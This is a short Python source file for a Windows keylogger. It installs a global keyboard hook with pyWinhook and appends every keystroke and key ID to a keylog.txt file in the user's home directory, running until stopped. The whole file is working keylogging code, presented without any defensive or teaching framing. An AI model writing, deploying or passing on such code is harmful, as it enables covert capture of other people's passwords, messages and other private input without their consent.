import os
import pythoncom
import pyWinhook as pyHook

log_file_path = os.path.join(os.path.expanduser("~"), "keylog.txt")

def on_keyboard_event(event):
    try:
        with open(log_file_path, "a") as f:
            f.write(f'Key: {event.Key} - KeyID: {event.KeyID}\n')
    except Exception as e:
        print(f"Wf error: {e}")
    return True 

def main():
    hm = pyHook.HookManager()
    
    hm.KeyDown = on_keyboard_event
    
    hm.HookKeyboard()
    
    pythoncom.PumpMessages()

if __name__ == "__main__":
    main()
